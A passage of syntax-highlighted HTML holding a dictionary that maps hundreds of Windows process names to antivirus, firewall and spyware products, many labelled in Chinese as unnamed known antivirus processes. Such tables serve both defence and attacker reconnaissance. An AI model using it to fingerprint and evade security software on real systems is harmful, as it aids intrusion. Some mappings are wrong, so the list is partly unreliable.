class="hljs-string">&quot;claw95cf.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;clean.exe&quot;</span>: <span class="hljs-string">&quot;windows流氓软件清理大师&quot;</span>,<br><span class="hljs-string">&quot;cleaner.exe&quot;</span>: <span class="hljs-string">&quot;windows流氓软件清理大师&quot;</span>,<br><span class="hljs-string">&quot;cleaner3.exe&quot;</span>: <span class="hljs-string">&quot;windows流氓软件清理大师&quot;</span>,<br><span class="hljs-string">&quot;cleanpc.exe&quot;</span>: <span class="hljs-string">&quot;windows流氓软件清理大师&quot;</span>,<br><span class="hljs-string">&quot;cpd.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;ctrl.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;cv.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;defalert.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;defscangui.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;defwatch.exe&quot;</span>: <span class="hljs-string">&quot;Norton Antivirus&quot;</span>,<br><span class="hljs-string">&quot;doors.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;dpf.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;dpps2.exe&quot;</span>: <span class="hljs-string">&quot;PanicWare&quot;</span>,<br><span class="hljs-string">&quot;dssagent.exe&quot;</span>: <span class="hljs-string">&quot;Broderbund&quot;</span>,<br><span class="hljs-string">&quot;ecengine.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;emsw.exe&quot;</span>: <span class="hljs-string">&quot;Alset Inc&quot;</span>,<br><span class="hljs-string">&quot;ent.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;espwatch.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;ethereal.exe&quot;</span>: <span class="hljs-string">&quot;RationalClearCase&quot;</span>,<br><span class="hljs-string">&quot;exe.avxw.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;expert.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;f‐prot95.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;fameh32.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;fast.exe&quot;</span>: <span class="hljs-string">&quot; FastUsr&quot;</span>,<br><span class="hljs-string">&quot;fch32.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;fih32.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;findviru.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;firewall.exe&quot;</span>: <span class="hljs-string">&quot;AshampooSoftware&quot;</span>,<br><span class="hljs-string">&quot;fnrb32.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;fp‐win.exe&quot;</span>: <span class="hljs-string">&quot; F‐Prot Antivirus OnDemand&quot;</span>,<br><span class="hljs-string">&quot;fsaa.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;fsav.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;fsav32.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;fsav530stbyb.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;fsav530wtbyb.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;fsav95.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;fsgk32.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;fsm32.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;fsma32.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;fsmb32.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;gbmenu.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;guard.exe&quot;</span>: <span class="hljs-string">&quot;ewido&quot;</span>,<br><span class="hljs-string">&quot;guarddog.exe&quot;</span>: <span class="hljs-string">&quot;ewido&quot;</span>,<br><span class="hljs-string">&quot;htlog.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;htpatch.exe&quot;</span>: <span class="hljs-string">&quot;Silicon Integrated Systems Corporation&quot;</span>,<br><span class="hljs-string">&quot;hwpe.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;iamapp.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;iamserv.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;iamstats.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;iedriver.exe&quot;</span>: <span class="hljs-string">&quot; Urlblaze.com&quot;</span>,<br><span class="hljs-string">&quot;iface.exe&quot;</span>: <span class="hljs-string">&quot;Panda Antivirus Module&quot;</span>,<br><span class="hljs-string">&quot;infus.exe&quot;</span>: <span class="hljs-string">&quot;Infus Dialer&quot;</span>,<br><span class="hljs-string">&quot;infwin.exe&quot;</span>: <span class="hljs-string">&quot;Msviewparasite&quot;</span>,<br><span class="hljs-string">&quot;intdel.exe&quot;</span>: <span class="hljs-string">&quot;Inet Delivery&quot;</span>,<br><span class="hljs-string">&quot;intren.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;jammer.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;kavpf.exe&quot;</span>: <span class="hljs-string">&quot;Kapersky&quot;</span>,<br><span class="hljs-string">&quot;kazza.exe&quot;</span>: <span class="hljs-string">&quot;Kapersky&quot;</span>,<br><span class="hljs-string">&quot;keenvalue.exe&quot;</span>: <span class="hljs-string">&quot;EUNIVERSE INC&quot;</span>,<br><span class="hljs-string">&quot;launcher.exe&quot;</span>: <span class="hljs-string">&quot;Intercort Systems&quot;</span>,<br><span class="hljs-string">&quot;ldpro.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;ldscan.exe&quot;</span>: <span class="hljs-string">&quot;Windows Trojans Inspector&quot;</span>,<br><span class="hljs-string">&quot;localnet.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;luall.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;luau.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;lucomserver.exe&quot;</span>: <span class="hljs-string">&quot;Norton&quot;</span>,<br><span class="hljs-string">&quot;mcagent.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mcmnhdlr.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mctool.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mcupdate.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mcvsrte.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mcvsshld.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mfin32.exe&quot;</span>: <span class="hljs-string">&quot;MyFreeInternetUpdate&quot;</span>,<br><span class="hljs-string">&quot;mfw2en.exe&quot;</span>: <span class="hljs-string">&quot;MyFreeInternetUpdate&quot;</span>,<br><span class="hljs-string">&quot;mfweng3.02d30.exe&quot;</span>: <span class="hljs-string">&quot;MyFreeInternetUpdate&quot;</span>,<br><span class="hljs-string">&quot;mgavrtcl.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mgavrte.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mghtml.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mgui.exe&quot;</span>: <span class="hljs-string">&quot;BullGuard&quot;</span>,<br><span class="hljs-string">&quot;minilog.exe&quot;</span>: <span class="hljs-string">&quot;Zone Labs Inc&quot;</span>,<br><span class="hljs-string">&quot;mmod.exe&quot;</span>: <span class="hljs-string">&quot;EzulaInc&quot;</span>,<br><span class="hljs-string">&quot;mostat.exe&quot;</span>: <span class="hljs-string">&quot;WurldMediaInc&quot;</span>,<br><span class="hljs-string">&quot;mpfagent.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mpfservice.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mpftray.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mscache.exe&quot;</span>: <span class="hljs-string">&quot;Integrated Search Technologies Spyware&quot;</span>,<br><span class="hljs-string">&quot;mscman.exe&quot;</span>: <span class="hljs-string">&quot;OdysseusMarketingInc&quot;</span>,<br><span class="hljs-string">&quot;msmgt.exe&quot;</span>: <span class="hljs-string">&quot;Total Velocity Spyware&quot;</span>,<br><span class="hljs-string">&quot;msvxd.exe&quot;</span>: <span class="hljs-string">&quot;W32/Datom‐A&quot;</span>,<br><span class="hljs-string">&quot;mwatch.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;nav.exe&quot;</span>: <span class="hljs-string">&quot;Reuters Limited&quot;</span>,<br><span class="hljs-string">&quot;navapsvc.exe&quot;</span>: <span class="hljs-string">&quot;Norton AntiVirus&quot;</span>,<br><span class="hljs-string">&quot;navapw32.exe&quot;</span>: <span class="hljs-string">&quot;Norton AntiVirus&quot;</span>,<br><span class="hljs-string">&quot;navw32.exe&quot;</span>: <span class="hljs-string">&quot;Norton Antivirus&quot;</span>,<br><span class="hljs-string">&quot;ndd32.exe&quot;</span>: <span class="hljs-string">&quot;诺顿磁盘医生&quot;</span>,<br><span class="hljs-string">&quot;neowatchlog.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;netutils.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;nisserv.exe&quot;</span>: <span class="hljs-string">&quot;Norton&quot;</span>,<br><span class="hljs-string">&quot;nisum.exe&quot;</span>: <span class="hljs-string">&quot;Norton&quot;</span>,<br><span class="hljs-string">&quot;nmain.exe&quot;</span>: <span class="hljs-string">&quot;Norton&quot;</span>,<br><span class="hljs-string">&quot;nod32.exe&quot;</span>: <span class="hljs-string">&quot;ESET Smart Security&quot;</span>,<br><span class="hljs-string">&quot;norton_internet_secu_3.0_407.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;notstart.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;nprotect.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;npscheck.exe&quot;</span>: <span class="hljs-string">&quot;Norton&quot;</span>,<br><span class="hljs-string">&quot;npssvc.exe&quot;</span>: <span class="hljs-string">&quot;Norton&quot;</span>,<br><span class="hljs-string">&quot;ntrtscan.exe&quot;</span>: <span class="hljs-string">&quot;趋势反病毒应用程序&quot;</span>,<br><span class="hljs-string">&quot;nui.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;otfix.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;outpostinstall.exe&quot;</span>: <span class="hljs-string">&quot;Outpost&quot;</span>,<br><span class="hljs-string">&quot;patch.exe&quot;</span>: <span class="hljs-string">&quot;趋势科技&quot;</span>,<br><span class="hljs-string">&quot;pavw.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;pcscan.exe&quot;</span>: <span class="hljs-string">&quot;趋势科技&quot;</span>,<br><span class="hljs-string">&quot;pdsetup.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;persfw.exe&quot;</span>: <span class="hljs-string">&quot;Tiny Personal Firewall&quot;</span>,<br><span class="hljs-string">&quot;pgmonitr.exe&quot;</span>: <span class="hljs-string">&quot;PromulGate SpyWare&quot;</span>,<br><span class="hljs-string">&quot;pingscan.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;platin.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;pop3trap.exe&quot;</span>: <span class="hljs-string">&quot;PC‐cillin&quot;</span>,<br><span class="hljs-string">&quot;poproxy.exe&quot;</span>: <span class="hljs-string">&quot;NortonAntiVirus&quot;</span>,<br><span class="hljs-string">&quot;popscan.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;powerscan.exe&quot;</span>: <span class="hljs-string">&quot;Integrated Search Technologies&quot;</span>,<br><span class="hljs-string">&quot;ppinupdt.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;pptbc.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;ppvstop.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;prizesurfer.exe&quot;</span>: <span class="hljs-string">&quot;Prizesurfer&quot;</span>,<br><span class="hljs-string">&quot;prmt.exe&quot;</span>: <span class="hljs-string">&quot;OpiStat&quot;</span>,<br><span class="hljs-string">&quot;prmvr.exe&quot;</span>: <span class="hljs-string">&quot;Adtomi&quot;</span>,<br><span class="hljs-string">&quot;processmonitor.exe&quot;</span>: <span class="hljs-string">&quot;Sysinternals&quot;</span>,<br><span class="hljs-string">&quot;proport.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;protectx.exe&quot;</span>: <span class="hljs-string">&quot;ProtectX&quot;</span>,<br><span class="hljs-string">&quot;pspf.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;purge.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;qconsole.exe&quot;</span>: <span class="hljs-string">&quot;Norton AntiVirus Quarantine Console&quot;</span>,<br><span class="hljs-string">&quot;qserver.exe&quot;</span>: <span class="hljs-string">&quot;Norton Internet Security&quot;</span>,<br><span class="hljs-string">&quot;rapapp.exe&quot;</span>: <span class="hljs-string">&quot;BlackICE&quot;</span>,<br><span class="hljs-string">&quot;rb32.exe&quot;</span>: <span class="hljs-string">&quot;RapidBlaster&quot;</span>,<br><span class="hljs-string">&quot;rcsync.exe&quot;</span>: <span class="hljs-string">&quot;PrizeSurfer&quot;</span>,<br><span class="hljs-string">&quot;realmon.exe&quot;</span>: <span class="hljs-string">&quot;Realmon &quot;</span>,<br><span class="hljs-string">&quot;rescue.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;rescue32.exe&quot;</span>: <span class="hljs-string">&quot;卡巴斯基互联网安全套装&quot;</span>,<br><span class="hljs-string">&quot;rshell.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;rtvscn95.exe&quot;</span>: <span class="hljs-string">&quot;Real‐time virus scanner &quot;</span>,<br><span class="hljs-string">&quot;rulaunch.exe&quot;</span>: <span class="hljs-string">&quot;McAfee User Interface&quot;</span>,<br><span class="hljs-string">&quot;run32dll.exe&quot;</span>: <span class="hljs-string">&quot;PAL PC Spy&quot;</span>,<br><span class="hljs-string">&quot;safeweb.exe&quot;</span>: <span class="hljs-string">&quot;PSafe Tecnologia&quot;</span>,<br><span class="hljs-string">&quot;sbserv.exe&quot;</span>: <span class="hljs-string">&quot;Norton Antivirus&quot;</span>,<br><span class="hljs-string">&quot;scrscan.exe&quot;</span>: <span class="hljs-string">&quot;360杀毒&quot;</span>,<br><span class="hljs-string">&quot;sfc.exe&quot;</span>: <span class="hljs-string">&quot;System file checker&quot;</span>,<br><span class="hljs-string">&quot;sh.exe&quot;</span>: <span class="hljs-string">&quot;MKS Toolkit for Win3&quot;</span>,<br><span class="hljs-string">&quot;showbehind.exe&quot;</span>: <span class="hljs-string">&quot;MicroSmarts Enterprise Component &quot;</span>,<br><span class="hljs-string">&quot;soap.exe&quot;</span>: <span class="hljs-string">&quot;System Soap Pro&quot;</span>,<br><span class="hljs-string">&quot;sofi.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;sperm.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;supporter5.exe&quot;</span>: <span class="hljs-string">&quot;eScorcher反病毒&quot;</span>,<br><span class="hljs-string">&quot;symproxysvc.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;symtray.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;tbscan.exe&quot;</span>: <span class="hljs-string">&quot;ThunderBYTE&quot;</span>,<br><span class="hljs-string">&quot;tc.exe&quot;</span>: <span class="hljs-string">&quot;TimeCalende&quot;</span>,<br><span class="hljs-string">&quot;titanin.exe&quot;</span>: <span class="hljs-string">&quot;TitanHide&quot;</span>,<br><span class="hljs-string">&quot;tvmd.exe&quot;</span>: <span class="hljs-string">&quot;Total Velocity&quot;</span>,<br><span class="hljs-string">&quot;tvtmd.exe&quot;</span>: <span class="hljs-string">&quot; Total Velocity&quot;</span>,<br><span class="hljs-string">&quot;vettray.exe&quot;</span>: <span class="hljs-string">&quot;eTrust&quot;</span>,<br><span class="hljs-string">&quot;vir‐help.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;vnpc3000.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;vpc32.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;vpc42.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;vshwin32.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;vsmain.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;vsstat.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;wfindv32.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;zapro.exe&quot;</span>: <span class="hljs-string">&quot;Zone Alarm&quot;</span>,<br><span class="hljs-string">&quot;zonealarm.exe&quot;</span>: <span class="hljs-string">&quot;Zone Alarm&quot;</span>,<br><span class="hljs-string">&quot;AVPM.exe&quot;</span>: <span class="hljs-string">&quot;Kaspersky&quot;</span>,<br><span class="hljs-string">&quot;A2CMD.exe&quot;</span>: <span class="hljs-string">&quot;Emsisoft Anti‐Malware&quot;</span>,<br><span class="hljs-string">&quot;A2SERVICE.exe&quot;</span>: <span class="hljs-string">&quot;a‐squared free&quot;</span>,<br><span class="hljs-string">&quot;A2FREE.exe&quot;</span>: <span class="hljs-string">&quot;a‐squared Free&quot;</span>,<br><span class="hljs-string">&quot;ADVCHK.exe&quot;</span>: <span class="hljs-string">&quot;Norton AntiVirus&quot;</span>,<br><span class="hljs-string">&quot;AGB.exe&quot;</span>: <span class="hljs-string">&quot;安天防线&quot;</span>,<br><span class="hljs-string">&quot;AHPROCMONSERVER.exe&quot;</span>: <span class="hljs-string">&quot;安天防线&quot;</span>,<br><span class="hljs-string">&quot;AIRDEFENSE.exe&quot;</span>: <span class="hljs-string">&quot;AirDefense&quot;</span>,<br><span class="hljs-string">&quot;ALERTSVC.exe&quot;</span>: <span class="hljs-string">&quot;Norton AntiVirus&quot;</span>,<br><span class="hljs-string">&quot;AVIRA.exe&quot;</span>: <span class="hljs-string">&quot;小红伞杀毒&quot;</span>,<br><span class="hljs-string">&quot;AMON.exe&quot;</span>: <span class="hljs-string">&quot;Tiny Personal Firewall&quot;</span>,<br><span class="hljs-string">&quot;AVZ.exe&quot;</span>: <span class="hljs-string">&quot;AVZ&quot;</span>,<br><span class="hljs-string">&quot;ANTIVIR.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;APVXDWIN.exe&quot;</span>: <span class="hljs-string">&quot;熊猫卫士&quot;</span>,<br><span class="hljs-string">&quot;ASHMAISV.exe&quot;</span>: <span class="hljs-string">&quot;Alwil&quot;</span>,<br><span class="hljs-string">&quot;ASHSERV.exe&quot;</span>: <span class="hljs-string">&quot;Avast Anti‐virus&quot;</span>,<br><span class="hljs-string">&quot;ASHSIMPL.exe&quot;</span>: <span class="hljs-string">&quot;AVAST!VirusCleaner&quot;</span>,<br><span class="hljs-string">&quot;ASHWEBSV.exe&quot;</span>: <span class="hljs-string">&quot;Avast&quot;</span>,<br><span class="hljs-string">&quot;ASWUPDSV.exe&quot;</span>: <span class="hljs-string">&quot;Avast&quot;</span>,<br><span class="hljs-string">&quot;ASWSCAN.exe&quot;</span>: <span class="hljs-string">&quot;Avast&quot;</span>,<br><span class="hljs-string">&quot;AVCIMAN.exe&quot;</span>: <span class="hljs-string">&quot;熊猫卫士&quot;</span>,<br><span class="hljs-string">&quot;AVCONSOL.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;AVENGINE.exe&quot;</span>: <span class="hljs-string">&quot;熊猫卫士&quot;</span>,<br><span class="hljs-string">&quot;AVESVC.exe&quot;</span>: <span class="hljs-string">&quot;Avira AntiVir Security Service&quot;</span>,<br><span class="hljs-string">&quot;AVEVL32.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;AVGAM.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;AVGCC.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;AVGCHSVX.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;AVGCSRVX&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;AVGNSX.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;AVGCC32.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;AVGCTRL.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;AVGEMC.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;AVGFWSRV.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;AVGNTMGR.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;AVGSERV.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;AVGTRAY.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;AVGUPSVC.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;AVINITNT.exe&quot;</span>: <span class="hljs-string">&quot;Command AntiVirus for NT Server&quot;</span>,<br><span class="hljs-string">&quot;AVPCC.exe&quot;</span>: <span class="hljs-string">&quot;Kaspersky&quot;</span>,<br><span class="hljs-string">&quot;AVSERVER.exe&quot;</span>: <span class="hljs-string">&quot;Kerio MailServer&quot;</span>,<br><span class="hljs-string">&quot;AVSCHED32.exe&quot;</span>: <span class="hljs-string">&quot;H+BEDV&quot;</span>,<br><span class="hljs-string">&quot;AVSYNMGR.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;AVWUPSRV.exe&quot;</span>: <span class="hljs-string">&quot;H+BEDV&quot;</span>,<br><span class="hljs-string">&quot;BDSWITCH.exe&quot;</span>: <span class="hljs-string">&quot;BitDefender Module&quot;</span>,<br><span class="hljs-string">&quot;BLACKD.exe&quot;</span>: <span class="hljs-string">&quot;BlackICE&quot;</span>,<br><span class="hljs-string">&quot;CCEVTMGR.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;CFP.exe&quot;</span>: <span class="hljs-string">&quot;COMODO&quot;</span>,<br><span class="hljs-string">&quot;CLAMWIN.exe&quot;</span>: <span class="hljs-string">&quot;ClamWin Portable&quot;</span>,<br><span class="hljs-string">&quot;CUREIT.exe&quot;</span>: <span class="hljs-string">&quot;DrWeb CureIT&quot;</span>,<br><span class="hljs-string">&quot;DEFWATCH.exe&quot;</span>: <span class="hljs-string">&quot;Norton Antivirus&quot;</span>,<br><span class="hljs-string">&quot;DRWADINS.exe&quot;</span>: <span class="hljs-string">&quot;Dr.Web&quot;</span>,<br><span class="hljs-string">&quot;DRWEB.exe&quot;</span>: <span class="hljs-string">&quot;Dr.Web&quot;</span>,<br><span class="hljs-string">&quot;DEFENDERDAEMON.exe&quot;</span>: <span class="hljs-string">&quot;ShadowDefender&quot;</span>,<br><span class="hljs-string">&quot;EWIDOCTRL.exe&quot;</span>: <span class="hljs-string">&quot;Ewido Security Suite&quot;</span>,<br><span class="hljs-string">&quot;EZANTIVIRUSREGISTRATIONCHECK.exe&quot;</span>: <span class="hljs-string">&quot;e‐Trust Antivirus&quot;</span>,<br><span class="hljs-string">&quot;FIREWALL.exe&quot;</span>: <span class="hljs-string">&quot;AshampooSoftware&quot;</span>,<br><span class="hljs-string">&quot;FPROTTRAY.exe&quot;</span>: <span class="hljs-string">&quot;F‐PROT Antivirus&quot;</span>,<br><span class="hljs-string">&quot;FPWIN.exe&quot;</span>: <span class="hljs-string">&quot;Verizon&quot;</span>,<br><span class="hljs-string">&quot;FRESHCLAM.exe&quot;</span>: <span class="hljs-string">&quot;ClamAV&quot;</span>,<br><span class="hljs-string">&quot;FSAV32.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;FSBWSYS.exe&quot;</span>: <span class="hljs-string">&quot;F‐secure&quot;</span>,<br><span class="hljs-string">&quot;FSDFWD.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;FSGK32.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;FSGK32ST.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;FSMA32.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;FSMB32.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;FSSM32.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure&quot;</span>,<br><span class="hljs-string">&quot;GUARDGUI.exe&quot;</span>: <span 